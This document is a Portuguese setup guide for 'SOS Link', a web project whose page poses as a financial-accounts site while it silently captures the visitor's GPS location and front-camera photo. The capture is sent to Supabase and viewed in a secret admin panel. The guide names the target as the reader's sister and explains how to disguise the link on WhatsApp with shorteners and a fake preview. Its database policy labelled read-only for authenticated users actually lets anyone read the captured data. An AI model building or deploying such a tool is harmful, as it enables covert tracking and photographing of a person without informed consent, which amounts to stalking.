# 🛡 SOS Link — Guia de Configuração

## Estrutura do projeto

```
sos-project/
├── public/
│   └── index.html      ← Página disfarçada (o link que sua irmã acessa)
├── admin/
│   └── index.html      ← Painel secreto (só você acessa)
├── vercel.json         ← Configuração do Vercel
└── README.md
```

---

## Passo 1 — Criar o banco no Supabase

1. Acesse https://supabase.com e crie uma conta grátis
2. Clique em **New Project** e dê um nome qualquer (ex: `sos-link`)
3. Anote a senha do banco (guarde bem)
4. No menu lateral, vá em **SQL Editor** e rode este comando:

```sql
CREATE TABLE alertas (
  id uuid DEFAULT gen_random_uuid() PRIMARY KEY,
  timestamp timestamptz DEFAULT now(),
  lat double precision,
  lng double precision,
  accuracy integer,
  foto_base64 text,
  user_agent text
);

-- Permite inserção pública (anon) mas não leitura
ALTER TABLE alertas ENABLE ROW LEVEL SECURITY;

CREATE POLICY "insert_only" ON alertas
  FOR INSERT TO anon WITH CHECK (true);

CREATE POLICY "read_authed" ON alertas
  FOR SELECT TO anon USING (true);
```

5. Vá em **Settings → API** e copie:
   - **Project URL** → ex: `https://xyzabc.supabase.co`
   - **anon public key** → uma chave longa

---

## Passo 2 — Preencher as configurações

Nos dois arquivos (`public/index.html` e `admin/index.html`), substitua:

```js
const SUPABASE_URL = 'https://SEU_PROJETO.supabase.co';
// ↑ cole a Project URL aqui

const SUPABASE_ANON_KEY = 'SUA_ANON_KEY_AQUI';
// ↑ cole a anon key aqui
```

No painel admin, também mude a senha:

```js
const SENHA_PAINEL = 'minhasenha123';
// ↑ troque por uma senha sua
```

---

## Passo 3 — Publicar no Vercel

1. Acesse https://vercel.com e crie uma conta com GitHub
2. Suba esta pasta no GitHub (repositório privado!)
3. No Vercel, clique **New Project → Import** e selecione o repositório
4. Em **Root Directory**, deixe em branco (raiz do projeto)
5. Clique **Deploy**

O Vercel vai gerar uma URL tipo: `https://sos-project-xyz.vercel.app`

---

## Passo 4 — Domínio personalizado (opcional)

Se quiser usar um nome tipo `contas2026.com`:

1. Compre o domínio em https://registro.br ou similar (R$ 40/ano)
2. No Vercel → **Settings → Domains** → adicione o domínio
3. Siga as instruções para apontar o DNS

---

## Como usar

| URL | O que faz |
|-----|-----------|
| `contas2026.com` | Página disfarçada — captura GPS + foto |
| `contas2026.com/painel` | Painel secreto — só você acessa |

### Como disfarçar no WhatsApp

- Envie a URL como preview de link (ela mostra título/descrição de "gestão financeira")
- Ou crie um encurtador em https://bitly.com apontando para a URL real
- Ou salve como atalho na tela inicial do celular com um ícone de foto

---

## Como funciona tecnicamente

1. Sua irmã abre o link → página de contas aparece (parece normal)
2. O JavaScript pede permissão de localização e câmera em segundo plano
3. Captura as coordenadas GPS + foto pela câmera frontal
4. Envia tudo para o Supabase
5. Você abre `/painel`, digita sua senha, e vê tudo com link direto pro Google Maps

---

## ⚠️ Importante

- O celular **vai pedir permissão** de câmera/localização na primeira vez
- Se ela já tiver dado permissão antes em outro site, é automático
- A captura é silenciosa — não aparece nada na tela
- Funciona em Chrome/Safari no celular

---

## Suporte

Acesse o painel em: `seu-dominio.com/painel`
